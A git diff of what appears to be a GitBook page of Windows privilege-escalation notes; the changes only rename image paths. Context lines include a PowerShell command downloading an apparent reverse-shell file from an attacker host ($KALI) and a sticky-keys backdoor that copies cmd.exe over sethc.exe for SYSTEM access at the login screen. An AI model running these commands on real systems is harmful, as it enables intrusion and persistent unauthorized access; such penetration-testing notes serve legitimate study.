@@ -121,7 +121,7 @@ We can assign such privileges to any user, independent of their group membership
 
 <figure><img src="../../.gitbook/assets/image (6) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2) (5).png" alt=""><figcaption></figcaption></figure>
 
 We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system.
 
@@ -349,7 +349,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 
 <figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Modifying existing services
 
@@ -783,7 +783,7 @@ copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 
 After doing so, lock your session from the start menu.
 
-![](<../../.gitbook/assets/image (5) (3).png>)
+![](<../../.gitbook/assets/image (5) (3) (1).png>)
 
 You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen.
 
